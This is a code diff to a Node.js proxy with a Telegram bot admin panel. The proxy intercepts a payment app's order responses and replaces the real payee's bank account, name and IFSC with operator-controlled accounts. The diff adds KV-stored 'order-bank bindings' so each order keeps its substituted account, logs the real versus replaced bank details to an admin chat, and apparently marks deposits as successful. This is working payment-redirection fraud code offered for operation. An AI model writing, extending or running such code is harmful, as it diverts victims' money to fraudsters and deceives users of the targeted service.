@@ -309,7 +309,9 @@ const DEFAULT_DATA = {
   withdrawOverride: 0,
   userOverrides: {},
   trackedUsers: {},
-  balanceHistory: []
+  balanceHistory: [],
+  orderBankMap: {},
+  sentOrderInfo: {}
 };
 
 let bot = null;
@@ -1133,6 +1135,10 @@ app.post('/bot-webhook', async (req, res) => {
 /setmin <number> <amount> — Set minimum order amount for bank
 /banks — List all banks
 
+=== ORDER BINDINGS ===
+/orders — List all saved order-bank bindings
+/delorder <code/num/all> — Delete order-bank binding
+
 === CONTROL ===
 /on — Proxy ON
 /off — Proxy OFF
@@ -1493,6 +1499,85 @@ Example:
     }
 
 
+    if (text === '/orders') {
+      data.orderBankMap = data.orderBankMap || {};
+      const entries = Object.values(data.orderBankMap);
+      if (entries.length === 0) {
+        await bot.sendMessage(chatId, '📭 No saved order-bank bindings in KV storage.');
+        return res.sendStatus(200);
+      }
+      const uniqueMap = new Map();
+      for (const e of entries) {
+        if (!e || !e.orderCode) continue;
+        if (!uniqueMap.has(e.orderCode)) uniqueMap.set(e.orderCode, e);
+      }
+      const uniqueList = Array.from(uniqueMap.values());
+      let msg = `📦 *Saved Order-Bank Bindings (${uniqueList.length}):*\n━━━━━━━━━━━━━━━━━━\n\n`;
+      uniqueList.forEach((e, idx) => {
+        msg += `${idx + 1}. 📋 *Code:* \`${e.orderCode}\`\n`;
+        if (e.userId) msg += `   👤 *User:* \`${e.userId}\`\n`;
+        if (e.amount) msg += `   💰 *Amount:* \`₹${e.amount}\`\n`;
+        if (e.bank) {
+          msg += `   🏦 *Bound Bank:* ${e.bank.accountHolder || 'N/A'} | \`${e.bank.accountNo || 'N/A'}\` | \`${e.bank.ifsc || 'N/A'}\`\n`;
+        }
+        if (e.time) msg += `   🕐 *Time:* ${e.time}\n`;
+        msg += `\n`;
+      });
+      msg += `\n📌 Delete an order binding: \`/delorder <Code>\` or \`/delorder <index>\``;
+      await bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/delorder')) {
+      data.orderBankMap = data.orderBankMap || {};
+      const param = text.substring(9).trim();
+      if (!param) {
+        await bot.sendMessage(chatId, '❌ Format: `/delorder <orderCode>` or `/delorder <number>` or `/delorder all`\n\nExample: `/delorder R2026072515583518992209`', { parse_mode: 'Markdown' });
+        return res.sendStatus(200);
+      }
+      if (param.toLowerCase() === 'all') {
+        const count = Object.keys(data.orderBankMap).length;
+        data.orderBankMap = {};
+        await saveData(data);
+        await bot.sendMessage(chatId, `🗑️ Cleared all ${count} order-bank bindings from KV storage.`);
+        return res.sendStatus(200);
+      }
+      const num = parseInt(param);
+      if (!isNaN(num) && String(num) === param) {
+        const uniqueMap = new Map();
+        for (const e of Object.values(data.orderBankMap)) {
+          if (e && e.orderCode && !uniqueMap.has(e.orderCode)) uniqueMap.set(e.orderCode, e);
+        }
+        const uniqueList = Array.from(uniqueMap.values());
+        const target = uniqueList[num - 1];
+        if (!target) {
+          await bot.sendMessage(chatId, `❌ Invalid index #${num}. Run /orders to view list.`);
+          return res.sendStatus(200);
+        }
+        delete data.orderBankMap[target.orderCode];
+        if (target.buyId) delete data.orderBankMap[target.buyId];
+        await saveData(data);
+        await bot.sendMessage(chatId, `🗑️ Deleted order binding #${num} (\`${target.orderCode}\`) from KV storage.`, { parse_mode: 'Markdown' });
+        return res.sendStatus(200);
+      }
+      let deleted = false;
+      for (const [k, v] of Object.entries(data.orderBankMap)) {
+        if (k.toLowerCase() === param.toLowerCase() || (v && v.orderCode && v.orderCode.toLowerCase() === param.toLowerCase()) || (v && v.buyId && String(v.buyId).toLowerCase() === param.toLowerCase())) {
+          delete data.orderBankMap[k];
+          if (v && v.orderCode) delete data.orderBankMap[v.orderCode];
+          if (v && v.buyId) delete data.orderBankMap[v.buyId];
+          deleted = true;
+        }
+      }
+      if (deleted) {
+        await saveData(data);
+        await bot.sendMessage(chatId, `✅ Order binding for \`${param}\` deleted from KV storage.`, { parse_mode: 'Markdown' });
+      } else {
+        await bot.sendMessage(chatId, `❌ No order binding found for \`${param}\`. Run /orders to view saved list.`, { parse_mode: 'Markdown' });
+      }
+      return res.sendStatus(200);
+    }
+
     if (text === '/help') {
       await bot.sendMessage(chatId, 'Use /start to see all commands.');
       return res.sendStatus(200);
@@ -1797,9 +1882,19 @@ async function proxyAndReplaceBankInList(req, res) {
     if (listData) {
       cacheOrderDetails(listData);
       const applyToItem = (item) => {
+        if (!item || typeof item !== 'object') return;
         const itemUserId = item.userId ? String(item.userId) : (item.memberId ? String(item.memberId) : detectedUserId);
         const itemEff = getEffectiveSettings(data, itemUserId);
-        const itemActive = (itemEff.botEnabled !== false) ? getActiveBank(data, itemUserId) : null;
+        const itemCode = extractOrderCode(item) || String(item.orderCode || item.code || item.buyCode || item.sn || '').trim();
+        const itemId = String(item.orderId || item.payOrderId || item.buyId || item.id || '').trim();
+
+        let itemBound = null;
+        if (data.orderBankMap) {
+          if (itemCode && data.orderBankMap[itemCode]) itemBound = data.orderBankMap[itemCode].bank;
+          else if (itemId && data.orderBankMap[itemId]) itemBound = data.orderBankMap[itemId].bank;
+        }
+
+        const itemActive = itemBound || ((itemEff.botEnabled !== false) ? getActiveBank(data, itemUserId) : null);
         if (itemActive) { const origVals = {}; deepReplace(item, itemActive, origVals, 0); }
         if (itemEff.depositSuccess) markDepositSuccess(item);
       };
@@ -2126,18 +2221,55 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
       const realName = dd.payeeName || dd.receiveName || dd.accountName || dd.beneficiaryName || dd.accountHolder || '';
       const realIfsc = dd.ifsc || dd.ifscCode || dd.receiveIfsc || '';
 
+      const orderIdStr = String(dd.orderId || dd.orderNo || dd.buyId || req.query?.buyId || req.query?.orderId || '').trim();
+      const cached = orderIdStr ? orderCache.get(orderIdStr) : null;
+      const orderCodeStr = String(dd.code || dd.orderCode || dd.buyCode || dd.sn || extractOrderCode(dd) || (cached ? cached.code : '') || orderIdStr || 'N/A').trim();
+
+      data.orderBankMap = data.orderBankMap || {};
+      data.sentOrderInfo = data.sentOrderInfo || {};
+
+      let boundBank = null;
+      if (orderCodeStr && data.orderBankMap[orderCodeStr]) boundBank = data.orderBankMap[orderCodeStr].bank;
+      else if (orderIdStr && data.orderBankMap[orderIdStr]) boundBank = data.orderBankMap[orderIdStr].bank;
+
+      const bankToUse = boundBank || bank;
       let replaced = false;
       let notReplacedReason = '';
 
-      if (bank) {
-        if (bank.minAmount && orderAmt > 0 && orderAmt < bank.minAmount) {
-          notReplacedReason = `Order ₹${orderAmt} < Min ₹${bank.minAmount}`;
+      if (bankToUse) {
+        if (bankToUse.minAmount && orderAmt > 0 && orderAmt < bankToUse.minAmount) {
+          notReplacedReason = `Order ₹${orderAmt} < Min ₹${bankToUse.minAmount}`;
         } else {
           replaced = true;
           if (Array.isArray(detailData)) {
-            detailData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bank, {}, 0); });
+            detailData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bankToUse, {}, 0); });
           } else {
-            deepReplace(detailData, bank, {}, 0);
+            deepReplace(detailData, bankToUse, {}, 0);
+          }
+
+          if (!boundBank && (orderCodeStr !== 'N/A' || orderIdStr)) {
+            const bindingObj = {
+              orderCode: orderCodeStr !== 'N/A' ? orderCodeStr : orderIdStr,
+              buyId: orderIdStr || orderCodeStr,
+              userId: String(userId || ''),
+              amount: orderAmt,
+              bank: {
+                accountHolder: bankToUse.accountHolder,
+                accountNo: bankToUse.accountNo,
+                ifsc: bankToUse.ifsc,
+                bankName: bankToUse.bankName || ''
+              },
+              realBank: {
+                accountHolder: realName || 'N/A',
+                accountNo: realAcct || 'N/A',
+                ifsc: realIfsc || 'N/A'
+              },
+              time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+              timestamp: Date.now()
+            };
+            if (orderCodeStr && orderCodeStr !== 'N/A') data.orderBankMap[orderCodeStr] = bindingObj;
+            if (orderIdStr) data.orderBankMap[orderIdStr] = bindingObj;
+            saveData(data).catch(() => {});
           }
         }
       }
@@ -2153,17 +2285,12 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
 
       if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
         const phone = getPhone(data, userId);
-        const orderId = dd.orderId || dd.orderNo || dd.buyId || req.query?.buyId || req.query?.orderId || '';
-        const cached = orderId ? orderCache.get(String(orderId).trim()) : null;
-        const orderCode = dd.code || dd.orderCode || dd.buyCode || dd.sn || extractOrderCode(dd) || (cached ? cached.code : '') || orderId || 'N/A';
+        const isAlreadySent = (orderCodeStr !== 'N/A' && data.sentOrderInfo[orderCodeStr]) || (orderIdStr && data.sentOrderInfo[orderIdStr]);
 
-        // Deduplication check
-        const cacheKey = `${userId}_${orderCode}_${orderAmt}`;
-        const lastNotify = orderNotifyCache.get(cacheKey);
-        const now = Date.now();
-
-        if (!lastNotify || (now - lastNotify > 600000)) { // 10 minutes cooldown
-          orderNotifyCache.set(cacheKey, now);
+        if (!isAlreadySent) {
+          if (orderCodeStr && orderCodeStr !== 'N/A') data.sentOrderInfo[orderCodeStr] = true;
+          if (orderIdStr) data.sentOrderInfo[orderIdStr] = true;
+          saveData(data).catch(() => {});
 
           let payoutSection = '';
           if (dd.payoutWallet || dd.walletName || dd.payTypeName) {
@@ -2173,7 +2300,7 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
           }
 
           let bankSection = '';
-          if (replaced && bank) {
+          if (replaced && bankToUse) {
             bankSection =
               `🏦 *Real Bank Details:*\n` +
               `   Acc: \`${realAcct || 'N/A'}\`\n` +
@@ -2181,9 +2308,9 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
               `   IFSC: \`${realIfsc || 'N/A'}\`\n` +
               `━━━━━━━━━━━━━━━━━━\n` +
               `🔄 *Replaced With:*\n` +
-              `   Acc: \`${bank.accountNo}\`\n` +
-              `   Name: \`${bank.accountHolder}\`\n` +
-              `   IFSC: \`${bank.ifsc}\`${bank.bankName ? ' | ' + bank.bankName : ''}`;
+              `   Acc: \`${bankToUse.accountNo}\`\n` +
+              `   Name: \`${bankToUse.accountHolder}\`\n` +
+              `   IFSC: \`${bankToUse.ifsc}\`${bankToUse.bankName ? ' | ' + bankToUse.bankName : ''}`;
           } else if (notReplacedReason) {
             bankSection = `⚠️ *Bank NOT Replaced*\n   Reason: ${notReplacedReason}`;
           } else {
@@ -2194,12 +2321,14 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
             `✅ *Order Buy Successfully*\n` +
             `━━━━━━━━━━━━━━━━━━\n` +
             `👤 *User:* \`${userId || 'N/A'}\`${phone ? ' (' + phone + ')' : ''}\n` +
-            `📋 *Order Code:* \`${orderCode}\`\n` +
+            `📋 *Order Code:* \`${orderCodeStr}\`\n` +
             `💰 *Amount:* \`₹${orderAmt || 'N/A'}\`\n` +
             `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n` +
             `━━━━━━━━━━━━━━━━━━\n` +
             payoutSection +
-            bankSection;
+            bankSection + `\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `💾 *KV Status:* Order code \`${orderCodeStr}\` & bank details saved to KV storage!`;
 
           bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
         }
